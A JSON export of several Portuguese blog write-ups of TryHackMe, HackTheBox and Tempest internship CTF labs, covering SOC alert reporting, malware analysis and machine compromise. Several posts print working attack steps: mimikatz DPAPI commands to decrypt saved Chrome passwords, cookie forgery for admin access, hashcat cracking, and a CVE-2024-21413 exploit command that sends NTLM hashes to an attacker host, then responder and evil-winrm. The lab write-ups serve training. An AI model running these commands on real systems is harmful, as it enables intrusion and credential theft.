[
  
  {
    "title": "TryHackMe - Soc Level 1",
    "url": "/posts/TryHackMe-Soc-Level-1/",
    "categories": "TryHackMe",
    "tags": "tryhackme, blue team, easy",
    "date": "2025-04-25 07:00:12 -0300",
    





    
    "snippet": "ContextoEssa sala tem como objetivo preparar analistas SOC de nível 1 abordando cenários em que os analistas L1 enfrentam ataques reais que exigem resposta imediata e ações de remediação. Para isso...",
    "content": "ContextoEssa sala tem como objetivo preparar analistas SOC de nível 1 abordando cenários em que os analistas L1 enfrentam ataques reais que exigem resposta imediata e ações de remediação. Para isso, a sala introduz três conceitos fundamentais: relato de alertas (alert reporting), escalonamento (escalation) e comunicação (communication). Nela, vamos aprender a importância do relato e do escalonamento de alertas, como escrever comentários ou relatórios de casos de forma profissional, métodos eficazes de escalonamento e boas práticas de comunicação.Task 2“Na sala anterior, você aprendeu como classificar e fazer a triagem dos alertas. Mas talvez esteja curioso sobre o que acontece depois disso. Como a sua triagem ajuda a prevenir ameaças e impedir invasões? Esse é um novo tópico que será abordado em breve nesta sala, mas, por enquanto, vamos relembrar o caminho dos alertas.Primeiro, os analistas L1 recebem os alertas em plataformas como SIEM, EDR ou sistemas de gerenciamento de tickets. A maioria dos alertas é encerrada como falso positivo ou resolvida no próprio nível L1, mas os casos mais complexos e ameaçadores são encaminhados para o L2, que é responsável por remediar a maioria das violações. E para encaminhar os alertas adiante, é preciso aprender três novos termos: relato (reporting), escalonamento (escalation) e comunicação (communication).É como um funil: o L1 lida com 100 alertas, escalona 10 positivos reais (True Positives) para o L2, e apenas 1 deles acaba exigindo uma resposta forense e de investigação (DFIR) no final.Relato de Alertas (Alert Reporting)Antes de encerrar ou encaminhar o alerta para o L2, você pode precisar reportá-lo. Dependendo dos padrões da equipe e da gravidade do alerta, em vez de apenas um comentário breve, pode ser necessário documentar sua investigação com detalhes, garantindo que todas as evidências relevantes estejam incluídas. Isso é especialmente importante para os True Positives (positivos reais), que exigem escalonamento.Escalonamento de Alertas (Alert Escalation)Se um alerta classificado como True Positive exigir ações adicionais ou uma investigação mais profunda, ele deve ser escalonado para um analista L2, seguindo os procedimentos acordados. É nesse momento que o seu relatório de alerta é útil, pois o L2 irá utilizá-lo para obter o contexto inicial e gastar menos tempo começando a análise do zero.Comunicação (Communication)Você também pode precisar se comunicar com outros departamentos durante ou após a análise. Por exemplo, perguntar à equipe de TI se confirmam a concessão de privilégios administrativos a determinados usuários ou entrar em contato com o RH para obter mais informações sobre um funcionário recém-contratado.”Qual é o processo de encaminhar alertas suspeitos para um analista L2 revisar?R:Alert [Redacted]Qual é o processo de descrever formalmente os detalhes do alerta e as descobertas?R: Alert [Redacted]Task 3Antes de seguirmos em frente, é essencial esclarecer por que alguém gostaria que analistas L1 escrevessem relatórios, além de apenas marcar os alertas como True ou False Positives, e por que esse tópico não pode ser subestimado. Fazer com que analistas L1 escrevam relatórios de alertas serve a vários propósitos importantes:            Finalidade do Relatório de Alerta      Explicação                  Fornecer contexto para escalonamento      - Um relatório bem escrito economiza muito tempo dos analistas L2- Também os ajuda a entender rapidamente o que aconteceu              Salvar descobertas para registro      - Os logs brutos do SIEM são armazenados por 3 a 12 meses, mas os alertas são mantidos indefinidamente- Por isso, é melhor manter todo o contexto dentro do alerta, por precaução              Melhorar as habilidades de investigação      - Se você não consegue explicar de forma simples, é porque não entende bem o suficiente- Escrever relatórios é uma ótima forma de desenvolver as habilidades dos analistas L1 ao resumir os alertas      Imagine-se como um analista L2, membro da equipe de DFIR ou profissional de TI que precisa entender o alerta. O que você gostaria de ver no relatório? Recomendamos seguir a abordagem dos Cinco Qs (Five Ws) e incluir pelo menos os seguintes itens no relatório:Quem (Who): Qual usuário fez login, executou o comando ou baixou o arquivoO quê (What): Qual ação exata ou sequência de eventos foi realizadaQuando (When): Quando exatamente a atividade suspeita começou e terminouOnde (Where): Qual dispositivo, IP ou site esteve envolvido no alertaPor quê (Why): O mais importante dos Qs — o raciocínio por trás do seu veredito finalDe acordo com o dashboard SOC, qual e-mail de usuário vazou o documento sensível?O dashboard está disponível no link https://static-labs.tryhackme.cloud/apps/socl1-alertreporting/. Acessando-o, somos apresentados a um simulador de SIEM projetado pelo THM com alguns alertas.Verificando o alerta “Sensitive Document Share to External”, podemos encontrar a resposta para a questão:Analisando os novos alertas, quem é o ‘remetente’ do e-mail suspeito, provavelmente de phishing?Verificando o alerta “Email Marked as Phishing after Delivery”, podemos encontrar a resposta para a questão:Abra o alerta de phishing, leia os detalhes e tente entender a atividade.Usando o modelo dos Cinco Porquês (Five Ws), qual foi a flag que você recebeu após escrever um bom relatório?Verificando o alerta do e-mail de phishing, podemos analisar os 5 porquês, sendo eles:1 - Quem?-Microsoft Support: support@microsoft.com. Apesar de parecer legítimo, é um endereço falsificado (spoofed).-Eddie Huffman, IT Manager e.huffman@tryhackme.thm. Alvo com acesso privilegiado.2 - O quê?-Um e-mail de  phishing, contendo:  Linguagem alarmante (ex:  “600% price increase” , “urgent notice”)  Um anexo chamado  REPORT.rar , potencialmente malicioso  Falha nas verificações SPF e DKIM.3 - Quando?-27 de março de 2025 às 19h25.4 - Onde?-O ataque ocorreu via  e-mail corporativo, direcionado para um gerente de TI, potencialmente expondo a rede interna.5 - Por quê?-Provavelmente para:  Induzir o usuário a abrir o anexo malicioso  Explorar sua posição na empresa para obter acesso à rede  Roubar credenciais, instalar malware ou ransomwareCom essas informações, desenvolvi o seguinte relatório para o alerta:  Phishing identificado em 27/03/2025 às 19:25 - E-mail enviado de support@microsoft.com para Eddie Huffman (IT Manager), com tentativa de engenharia social explorando urgência relacionada a um suposto aumento no preço do Microsoft Teams. E-mail continha anexo malicioso em formato .rar. Cabeçalhos indicam falha nas validações de autenticação: SPF/Fail; DKIM/Fail. Indicativo de spoofing e potencial campanha de phishing com entrega de malware.Também preenchi o alerta da seguinte forma:Dessa forma, foi possível conseguir a flag.Task 4Depois de chegar a um veredito e escrever seu relatório de alerta, você deve decidir se o alerta precisa ser escalonado para o L2. Novamente, a resposta pode variar de equipe para equipe, mas as seguintes recomendações geralmente se aplicam à maioria dos times SOC. Você deve escalar os alertas se:  O alerta for um indicativo de um grande ciberataque que exija investigação mais profunda ou DFIR  Ações de remediação, como remoção de malware, isolamento de host ou redefinição de senha forem necessárias  For necessária comunicação com clientes, parceiros, gestão ou órgãos legais  Você simplesmente não entende totalmente o alerta e precisa de ajuda de analistas mais experientesEtapas de EscalonamentoPara escalar um alerta, na maioria dos casos, tudo o que você precisa fazer é reatribuir o alerta para o L2 de plantão e notificá-lo via chat corporativo ou pessoalmente. No entanto, em algumas equipes, pode ser necessário preencher uma solicitação formal de escalonamento com dezenas de campos obrigatórios.Independentemente do processo adotado, o L2 acabará recebendo o ticket, lendo o seu relatório e entrando em contato com você caso tenha dúvidas. Uma vez que tudo esteja claro, o analista L2 normalmente irá aprofundar a investigação do alerta, validar se ele é de fato um True Positive, comunicar-se com outros departamentos, se necessário, e, em casos graves, iniciar um processo formal de Resposta a Incidentes.Procedimento de Escalonamento no Painel SOC  Escreva um relatório do alerta e forneça seu veredito; mova o alerta para o status Em andamento (In Progress)  Atribua o alerta ao L2 de plantão. O L2 receberá uma notificação e começará a partir do seu relatórioEscalonando Ameaças para o L2Solicitando Suporte do L2Quem é o seu atual analista L2 no painel do SOC para quem você pode atribuir (escalonar) os alertas?Verificando as assinaturas disponiveís no simulador do SIEM, é possível identificar quem é o L2.Qual foi a flag que você recebeu após escalonar corretamente o alerta da tarefa anterior para o L2? Nota: Se você já escalonou corretamente o alerta anteriormente, basta editar o alerta e clicar em “Salvar” novamente.Voltando novamente ao alerta de phishing, é possível conseguir a flag realizando a edição do alerta da seguinte forma:Agora, investigue o segundo novo alerta na fila e forneça um comentário detalhado sobre o alerta. Em seguida, decida se é necessário escalonar esse alerta e siga o processo conforme indicado. Após concluir sua triagem, você deverá receber uma flag, que será a sua resposta!Analisando o alerta “Spike of Domain Discovery Commands” é possível encontrar as informações que precisamos para desenvolver nosso relatório.1 - Quem?-NT AUTHORITY\\SYSTEM. A atividade está sendo executada com permissões de sistema, o que indica que o processo tem acesso elevado e pode ter controle total sobre o sistema.-Processos envolvidos:  cmd.exe  revshell.exe2 - O quê?-Foi detectada uma sequência de comandos suspeitos (whoami, net user, Get-ADUser, etc.), frequentemente associada a descoberta de domínio Active Directory (AD), o que indica que a máquina pode estar sendo reconhecida por um atacante para mapear o ambiente AD. A atividade foi originada de um processo não autorizado (revshell.exe), indicando um possível acesso remoto indevido.3 - Quando?-27 de março de 2025, às 19h56.4 - Onde?-O alerta ocorreu no servidor DMZ-MSEXCHANGE-2013.-O sistema operacional é Windows Server 2012 R2, o que pode ser importante para avaliar vulnerabilidades conhecidas desse SO.5 - Por quê?-O uso de comandos típicos de descoberta de AD (como net user, whoami, nltest) pode indicar que um invasor está tentando mapear a rede e encontrar informações sensíveis, como contas de administrador ou outros dados de acesso. O fato de o processo ter sido iniciado por um script revshell.exe sugere que pode haver controle remoto malicioso em andamento, possivelmente com a intenção de comprometer ainda mais a rede ou exfiltrar dados.Com essas informações, desenvolvi o seguinte relatório para o alerta:  No dia 27/03/2025, foi detectado no host DMZ-MSEXCHANGE-2013, um padrão de comandos  associados a atividades de recon em ambientes Active Directory. Entre os comandos executados estão: dir, hostname, whoami /priv, net group “Domain Admins” /domain e nltest /dclist:tryhackme.thm. Essa atividade foi executada sob o contexto do usuário NT AUTHORITY\\SYSTEM, através do processo cmd.exe, iniciado pelo executável revshell.exe, cujo processo pai é w3wp.exe, indicando um possível comprometimento do servidor via shell reversa.Escalonei o alerta para L2, da seguinte forma:Dessa forma, conseguir a flag.Caso você discorde, ou queira adicionar algo a esse artigo, você pode me chamar no linkedin para que possamos conversar! https://www.linkedin.com/in/kaiobarbosa/ ."
  },
  
  {
    "title": "Prova de estágio Tempest 2",
    "url": "/posts/Tempest-Prova-de-Est%C3%A1gio-2/",
    "categories": "Tempest",
    "tags": "tempest",
    "date": "2025-01-13 01:00:12 -0300",
    





    
    "snippet": "ContextoA prova de estágio da Tempest ocorreu até o dia 08/01/2025 até 13/01/2025 e uma das etapas da prova, foi necessário ajudar uma empresa em que havia sido alvo de hackativitas.Foi fornecido o...",
    "content": "ContextoA prova de estágio da Tempest ocorreu até o dia 08/01/2025 até 13/01/2025 e uma das etapas da prova, foi necessário ajudar uma empresa em que havia sido alvo de hackativitas.Foi fornecido o link do site da empresa. Ao acessá-lo, uma mensagem deixada pelos atacantes estava visível:Analisando o código-fonte do site, foi encontrada uma assinatura dos atacantes no arquivo js:Pesquisando essa assinatura no GitHub, identifiquei um usuário chamado “MrGhostBot” com um repositório chamado “Narada”:Dentro desse repositório, localizei um código Python que criptografava qualquer string fornecida pelo usuário:Para que o código funcionasse, era necessário encontrar o valor da variável fixed_vector, que havia sido removida anteriormente. Mas, ao analisar o repositório, consegui localizar o valor dessa variável:Realizando uma varredura de diretórios no servidor, encontrei as rotas /chat, /login e /admin:Ao acessar /chat, descobri uma conversa entre o CTO e o Help Desk contendo um acesso cifrado:Para decifrar a string fornecida, alterei o código do repositório. Após as modificações, utilizei o valor de fixed_vector obtido e decifrei a string:import base64def string_to_binary(input_string):    return ''.join(format(ord(char), '08b') for char in input_string)def binary_to_string(binary_string):    char_array = [chr(int(binary_string[i:i+8], 2)) for i in range(0, len(binary_string), 8)]    return ''.join(char_array)def invert_binary(binary_string):    return ''.join('1' if bit == '0' else '0' for bit in binary_string)def reverse_binary(binary_string):    return binary_string[::-1]def xor_with_fixed_vector(binary_string, fixed_vector):    fixed_vector = fixed_vector[:len(binary_string)]    return ''.join(str(int(a) ^ int(b)) for a, b in zip(binary_string, fixed_vector))def binary_to_base64(binary_string):    byte_array = bytearray(int(binary_string[i:i+8], 2) for i in range(0, len(binary_string), 8))    return base64.b64encode(byte_array).decode()def base64_to_binary(base64_string):    byte_array = base64.b64decode(base64_string)    return ''.join(format(byte, '08b') for byte in byte_array)def decrypt(encrypted_base64, fixed_vector):    binary_string = base64_to_binary(encrypted_base64)    xored_binary = xor_with_fixed_vector(binary_string, fixed_vector)    reversed_binary = reverse_binary(xored_binary)    inverted_binary = invert_binary(reversed_binary)    return binary_to_string(inverted_binary)if __name__ == \"__main__\":    input_string =  \"Wfvb+dlz2RuZO3szeXMJm8NDW+Pz4w==\"    fixed_vector = \"10101010101010101010101010101010\" * 10    decrypted = decrypt(input_string, fixed_vector)    print(\"Decrypted String:\", decrypted)Com as credenciais obtidas, consegui acessar o sistema em /login:O sistema não era todo interativo, permitindo apenas a visualização dos endereços de carteira e o download de arquivos com as despesas. Como já havíamos identificado o endereço da carteira envolvida em uma transferência realizada em 15/06/2024, o próximo passo era descobrir quem havia feito a transferência de ID TXN0056.Ao realizar o download das despesas, o sistema forneceu apenas o arquivo exp_1.txt, que apresentava os 20 primeiros IDs:Suspeitei que existiam outros arquivos numerados sequencialmente. Usando o Burp Suite, modifiquei a solicitação para obter o arquivo exp_3.txt:Com sucesso, recebi o arquivo completo e identifiquei quem realizou a transferência:"
  },
  
  {
    "title": "THM - Chrome",
    "url": "/posts/THM-Chrome/",
    "categories": "THM, hard",
    "tags": "THM, hard",
    "date": "2024-12-09 13:00:12 -0300",
    





    
    "snippet": "ContextoUm agente malicioso entrou na rede e extraiu algo, mas a pergunta é: o que exatamente?Analisando os pacotes.A princípio, foi disponibilizado um pacote de rede para que seja realizada a anál...",
    "content": "ContextoUm agente malicioso entrou na rede e extraiu algo, mas a pergunta é: o que exatamente?Analisando os pacotes.A princípio, foi disponibilizado um pacote de rede para que seja realizada a análise do mesmo. Utilizando o Wireshark, podemos perceber que, em um primeiro momento, a maioria do tráfego ocorre através do protocolo SMB. O SMB é um protocolo de comunicação que permite o compartilhamento de arquivos, ou seja, ocorreu algum tráfego de arquivos na rede.Utilizando a opção de exportar objetos através do protocolo SMB, é possível identificar que houve a comunicação de dois arquivos interessantes: o transfer.exe e o encrypted_files.Engenharia reversa.Analisando o arquivo transfer.exe, foi possível identificar que ele foi compilado utilizando .NET Assembly. Após uma rápida pesquisa, encontrei a ferramenta ILSpy, que auxiliará na descompilação do .exeCom a ferramenta, foi possível acessar o código-fonte e, com isso, detectar que são declaradas duas matrizes de bytes e, em seguida, são utilizadas como chave e IV para a criptografia AES, utilizando o UTF-8. O atacante utiliza esse método para criptografar o arquivo files.zip e, depois, o transforma no arquivo encrypted_files, que foi extraído anteriormente utilizando o Wireshark.Com essas informações, consegui descriptografar o arquivo encrypted_files utilizando o CyberChef, com os dados encontrados durante a engenharia reversa.Analisando o .zip descompactado.Descompactando o arquivo files.zip, foi possível perceber que o agente malicioso extraiu da rede arquivos relacionados do Google Chrome.O Google Chrome utiliza a DPAPI em conjunto com o AES-256 para criptografar os dados. Nesse contexto, as senhas criptografadas podem ser encontradas no arquivo Login Data, localizado em /AppData/Local/Google/Chrome/User Data/Default. A criptografia das senhas é realizada com uma chave armazenada no arquivo Local State, que está localizado em AppData/Local/Google/Chrome/User Data.Ao consultar a documentação da Microsoft sobre a DPAPI, é possível verificar que a chave armazenada no arquivo Local State, usada para a descriptografação, é a master key do usuário, que, por sua vez, é criptografada com a senha do próprio usuário. Vale destacar que a master key, responsável por criptografar os dados protegidos pela DPAPI, pode ser localizada no diretório AppData/Roaming/Microsoft/Protect/SIDDessa forma, vai se construindo um caminho em que, para que seja possível visualizar os logins que estão armazenados, é necessário:1) Descobrir a senha local do usuário.2) Usar a senha local para descriptografar a master key.3) Utilizar a master key para descriptografar os logins armazenados.Descriptografando a senha do usuário.Será necessário utilizar o dpapimk2john para extrair a hash da senha para que o john consiga descriptografar.DPAPImk2john -mk AppData/Roaming/Microsoft/Protect/S-1-5-21-3854677062-280096443-3674533662-1001/8c6b6187-8eaa-48bd-be16-98212a441580 -c local -S S-1-5-21-3854677062-280096443-3674533662-1001 &gt; hash.txtDessa forma, é possível realizar o bruteforce na senha:Descriptografando a master key.Para avançarmos, será necessário o uso da ferramenta mimikatz. O mimikatz permite a extração de credenciais de autenticação de sistemas Windows, como senhas em texto simples, hashes de senhas, tickets Kerberos, e etc.Utilizando o comando:dpapi::masterkey /in:\"AppData/Roaming/Microsoft/Protect/S-1-5-21-3854677062-280096443-3674533662-1001/8c6b6187-8eaa-48bd-be16-98212a441580\" /sid:S-1-5-21-3854677062-280096443-3674533662-1001 /password: ?????????É possível extrair a master key.Descriptografando as senhas.Antes de realizarmos o procedimento para conseguirmos obter as credenciais armazenadas localmente no Google Chrome, será necessário extrair a chave armazenada no arquivo Local State. Dessa forma:cat AppData/Local/Google/Chrome/User\\ Data/Local\\ State | jq .os_crypt.encrypted_key -rVoltando ao mimikatz:dpapi::chrome /in:\"AppData/Local/Google/Chrome/User Data/Default/Login Data\" /masterkey:ca4387e???????????????0ddb868a03ee6a3f9840 /encryptedKey:RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAACHYWuMqo69SL4WmCEqRBWAAAAAAAIAAAAAABBmAAAAAQAAIAAAAHPuV6P/8jN+rng8E61Z0xxi2hUf4Q4oxa5gFqSnctqdAAAAAA6AAAAAAgAAIAAAAAEF9lst8zMKmCFJ3WmD46TZY/xJF+s5Xf9mTQ2wa16ZMAAAABFU2C2V+l6K3y7ROKkA0cIaWyuXB9i7zUwBBu6mt7vM2QGZtqmjhcX6ZSWrX8JUwkAAAADgBkMLAP19Rtax5T8aKAESgwV+ABz65DOgEGwwSkkQMbWrwz7p42SzpfJUj7jcyUSTOblLRNtB8YTwhm3wCQSiE assim, finalmente conseguimos visualizar as credenciais armazenadas:"
  },
  
  {
    "title": "HTB Sherlocks - Heartbreaker-Continuum",
    "url": "/posts/HTB-HeartbreakerContinuum/",
    "categories": "HTB, Sherlocks",
    "tags": "sherlocks, htb",
    "date": "2024-10-25 07:00:12 -0300",
    





    
    "snippet": "Heartbreaker-ContinuumApós um recente relatório de violação de dados na empresa, o cliente enviou um arquivo executável potencialmente malicioso. O arquivo se originou de um link em um e-mail de ph...",
    "content": "Heartbreaker-ContinuumApós um recente relatório de violação de dados na empresa, o cliente enviou um arquivo executável potencialmente malicioso. O arquivo se originou de um link em um e-mail de phishing recebido por um usuário vítima. Seu objetivo é analisar o binário para determinar sua funcionalidade e as possíveis consequências que ele pode ter na rede da empresa. Ao analisar a funcionalidade e as potenciais consequências desse binário, você poderá obter informações valiosas sobre o alcance da violação de dados e identificar se ele facilitou a exfiltração de dados. Compreender as capacidades do binário permitirá que você forneça ao cliente um relatório abrangente detalhando a metodologia do ataque, os dados potenciais em risco e as etapas recomendadas para mitigação.Task 1Para referenciar e identificar com precisão o binário suspeito, por favor forneça o hash SHA256 dele.Com o comando sha256num é possível identificar o hash do binário:R: 12DAA34111BB54B3DCBAD42305663E44E7E6C3842F015CCCBBE6564D9DFD3EA3Task 2Quando o arquivo binário foi originalmente criado, de acordo com seus metadados (UTC)?Para os próximos passos, usarei o PeStudio. O PeStudio é uma ferramenta de análise estática utilizada para examinar arquivos executáveis e permite a inspeção de executáveis sem a necessidade de executá-los.O PeStudio me deu a informação de quando o programa foi compilado no campo compiler-stamp:R: 2024-03-13 10:38:06Task 3Examinar o tamanho do código em um arquivo binário pode fornecer indicações sobre sua funcionalidade. Você poderia especificar o tamanho em bytes do código neste binário?Análisando na aba optional-header &gt; general &gt; size-of-code, é possível identificar o tamanho de bytes do código:R: 38400Task 4Parece que o binário pode ter passado por um processo de conversão de arquivo. Você poderia determinar seu nome de arquivo original?Análisando na aba resources é possível identificar o nome do arquivo original, sendo ele, um script em powershell:Task 5Especifique o deslocamento hexadecimal onde o código ofuscado do arquivo original identificado começa no binário.Para os próximos passos usarei o HxD, que é uma ferramenta de edição hexadecimal. Na minha análise identifiquei o começo do código ofuscado a partir do caractere $. O HxD apontou para o posição 2C74.R: 2C74Task 6O ator da ameaça ocultou o script em texto simples dentro do binário. Você pode fornecer o método de codificação usado para essa ofuscação?Da a entender que o código está em base64 pelo seu formato e também pelo uso do caractere igual (=).Utilizei a ferramenta CyberChef para reverter o código oculto e, também para descriptografar o script.R: Base64Task 7Qual é o cmdlet específico utilizado para iniciar downloads de arquivos?Análisando o script, é possível identificar logo nas primeiras linhas o comando Invoke-WebRequest que é utilizado para enviar solicitações HTTP e HTTPS para servidores web. Esse comando está acompanhado do -Uri que tem a finalidade de baixar arquivos.R: Invoke-WebRequestTask 8Você poderia identificar possíveis Indicadores de Compromisso (IoCs) relacionados à rede após examinar o código? Separe os IPs por vírgula e em ordem crescente.O termo indicadores de compromisso (IOC) abrange uma ampla variedade de dados, que podem ser usados para identificar atividades maliciosas dentro do sistema ou da rede. Análisando o script, é possível identificar dois endereços Ip’s. Um está relacionado ao login de ftp para exfiltração de arquivos da vítima, e o outro está realizando o download do arquivo Superstart_MemberCard.tiff.      R: 35.169.66.138,44.206.187.144Task 9O binário criou um diretório de preparação. Você pode especificar a localização desse diretório onde os arquivos coletados estão armazenados?Análisando o código é possível identitificar a pasta de arquivos coletados:R: C:\\Users\\Public\\Public FilesTask 10Qual ID do MITRE corresponde à técnica usada pelo binário malicioso para coletar dados de forma autônoma?O mitre que corresponde a técnica é o Automated Collection:R: T1119Task 11Qual é a senha utilizada para exfiltrar os arquivos coletados através do programa de transferência de arquivos dentro do binário?Lembram do ip em que possui um servidor ftp para exfiltração de arquivos? Bem, para que a conexão seja efetuada, foi necessário informar a senha via comando.R: M8&amp;C!i6KkmGL1-#"
  },
  
  {
    "title": "Prova de estágio Tempest",
    "url": "/posts/Prova-Tempest/",
    "categories": "Tempest",
    "tags": "tempest",
    "date": "2024-06-28 18:02:12 -0300",
    





    
    "snippet": "Prova de estágio TempestContextoA prova de estágio da Tempest ocorreu até o dia 28/07 e uma das partes dela era necessário resolver um “mini CTF”, em que, uma empresa denominada Quantum Nexys sofre...",
    "content": "Prova de estágio TempestContextoA prova de estágio da Tempest ocorreu até o dia 28/07 e uma das partes dela era necessário resolver um “mini CTF”, em que, uma empresa denominada Quantum Nexys sofreu um ataque de Ransomware e procurou um time especializado para tentar reaver os dados de contratos, clientes e parceiros que foram roubados de seu servidor principal. Mas um arquivo em específico, era referente a uma patente que foi feita recentemente e que não havia backup. Dessa forma, foi apresentado o arquivo dessa patente criptografado em uma mensagem pgp:Além disso, também foi apresentado o link de um site em que os criminosos solicitavam um ID, que foi fornecido a empresa, e também o endereço da carteira digital que foi usada para efetuar o pagamento. Eles utilizavam desse método para verificar se o pagamento realmente foi efetuado e teoricamente, enviar a chave para descriptografar os arquivos.EnumeraçãoEu havia feito a prova anterior da Tempest, e muitas informações valiosas já estavam disponíveis no código HTML, então, eu pulei as primeiras etapas que seriam: análise de portas abertas e diretórios.Análisando o código, percebi no código javascript da página um redirecionamento de dados para uma API que estava em outro domínio.Uma tela de login foi apresentada indo até o outro domínio, era o forúm dos criminosos.Uma das formas em que os sites utilizam para se proteger de robôs de buscas, é utilizando o robots.txt. Dessa forma, consegui verificar alguns diretórios que estavam disponíveis nesse forúm analisando o conteúdo deste arquivo.Analisando logo o primeiro diretório (/api/), encontrei um arquivo .yaml, e neste arquivo estavam armazenadas as credenciais de um usuário do forúm que havia solicitado a alteração de senha.Com essas credenciais, foi possível acessar o forúm.Mas, havia um problema. Esse usuário não estava com permissões de vizualização do forúm, apenas de acesso.Verificando o site via Burp Suit, consegui detectar que os cookies eram enviados em forma de base64 e, dessa forma, seria possível realizar alterações que resultariam no envenamento desses cookies.Analisando os cookies, para verificar quais informações eram passadas para que eu conseguisse altera-lo.Alterei a opção de enabled de false para true, resultando em:Alterando manualmente o cookie legítimo para o que foi envenenado, eu consegui visualizar o conteúdo do forúm.Nesse mesmo print, é possível identificar a empresa que foi vitíma do Ransoware e que nos contatou, e além de outras vitímas do forúm. Mas com esse usuário, não foi possível acessar o tópico do forúm.Escalonamento de privilégioDessa forma, será necessário escalonar para um usuário com permissão para acessar o tópico e conseguir mais informações a respeito do ataque. Navegando pelo forúm é possível encontrar o tópico de membros no menu. Nesse tópico, é listado todos os membros do forúm juntamente com suas permissões.Novamente, envenenei os cookies, mas dessa vez, com informações dos administrador do forúm alterando a parte de username e role. Dessa forma, consegui acesso ao tópico da empresa Quantum Nexys.Infelizmente, no tópico na empresa não foi possível encontrar a chave privada ou até mesmo informações que ajudasse a encontrar a chave privada para descriptografar a mensagem.Chave privadaNavegando pelo forúm, descobri que as chaves públicas dos usuários do forúm ficavam disponíveis nos seus perfis.Guardem essa informação.Procurando novamente pelos diretórios do forúm, encontrei o diretório das campanhas de Ransomware e acessando-o:Bom, encontrei uma pegadinha das pessoas que formularam o teste.Análisei e percebi que toda vez solicitavamos as chaves públicas dos usuários, o sistema buscava pelo diretório das campanhas + id da empresa. Dessa forma, acessei esse diretório manualmente e percebi que as chaves públicas e privadas estavam realmente armazenadas lá.Tentando acessar essas chaves a partir do diretório, o sistema sempre dava como não-autorizado mesmo envenenando os cookies como administrador ou como o usuário que fez o ataque.Percebi então, que a única forma de conseguir a chave privada, era atráves do perfil do usuário quando ele solicitava a chave pública. A ideia era de que, se daquele meio, eu conseguia acesso a chave pública, eu também conseguiria acesso a chave privada apenas alterando o valor em que a url solicitava o arquivo id_pgp.pub para id.pgp. Também envenenei os cookies para o usuário do forúm que fez o ataque (não foi o administrador), dessa forma, o site deve me retornar a chave privada desse usuário destinada a esse ataque, já que cada ataque possui uma chave privada própria.E… voilà! Aqui estava a chave privada. Com ela, é possível descriptografar o arquivo da patente."
  },
  
  {
    "title": "HTB Máquinas - Mailing",
    "url": "/posts/HTB-Mailing/",
    "categories": "HTB, Máquinas",
    "tags": "máquinas, htb",
    "date": "2024-05-06 04:50:12 -0300",
    





    
    "snippet": "MailingEnumeração┌──(yoshiro㉿kali)-[~]└─$ nmap -sV -A 10.10.11.14    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-06 08:22 -03Nmap scan report for mailing.htb (10.10.11.14)Host is up (0.35...",
    "content": "MailingEnumeração┌──(yoshiro㉿kali)-[~]└─$ nmap -sV -A 10.10.11.14    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-06 08:22 -03Nmap scan report for mailing.htb (10.10.11.14)Host is up (0.35s latency).Not shown: 990 filtered tcp ports (no-response)PORT    STATE SERVICE       VERSION25/tcp  open  smtp          hMailServer smtpd| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY80/tcp  open  http          Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-methods: |_  Potentially risky methods: TRACE|_http-title: Mailing110/tcp open  pop3          hMailServer pop3d|_pop3-capabilities: USER UIDL TOP135/tcp open  msrpc         Microsoft Windows RPC139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn143/tcp open  imap          hMailServer imapd|_imap-capabilities: ACL IMAP4rev1 CHILDREN IDLE NAMESPACE RIGHTS=texkA0001 CAPABILITY SORT completed IMAP4 OK QUOTA445/tcp open  microsoft-ds?465/tcp open  ssl/smtp      hMailServer smtpd|_ssl-date: TLS randomness does not represent time| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU| Not valid before: 2024-02-27T18:24:10|_Not valid after:  2029-10-06T18:24:10587/tcp open  smtp          hMailServer smtpd|_ssl-date: TLS randomness does not represent time| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU| Not valid before: 2024-02-27T18:24:10|_Not valid after:  2029-10-06T18:24:10993/tcp open  ssl/imap      hMailServer imapd|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU| Not valid before: 2024-02-27T18:24:10|_Not valid after:  2029-10-06T18:24:10Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: |   date: 2024-05-06T11:23:15|_  start_date: N/A| smb2-security-mode: |   3:1:1: |_    Message signing enabled but not requiredService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 98.23 secondsÉ possível identificar que o servidor está rodando Microsoft-IIS/10. E esse servidor é vulneravel a ataques LFI.Explorando a vulnerabildadeIndo até ../../Program+Files+(x86)/hMailServer/Logs/hmailserver_awstats.log é possível vizualizar usuários cadastrados.Indo até ../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI é possível identificar uma hash de senha.User flagEssa Hash se trata de uma MD5. Quebrando-a:┌──(yoshiro㉿kali)-[~/htb]└─$ hashcat -m 0 -a 0 hash.txt rockyou.txt Com esse login, é possível acessar o telnet.Pesquisando novamente encontrei esse exploit: https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability?tab=readme-ov-fileEsse exploit permite enviar um e-mail para a Maya para capturar a senha do NTLM.python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url '\\\\10.10.14.51\\mailing' --subject YoshiUtilize o responder para capturar o e-mail enviado para a Maya.sudo responder -I tun0 -vudo responder -I tun0 -vQuebrando:hashcat -m 5600 hash.txt rockyou.txt Utilizando o login da maya, é possível acessar a máquina via evil-winrm e conseguir a user flag.evil-winrm -i 10.10.11.14 -u maya -p 'm4y4ngs4ri'Root 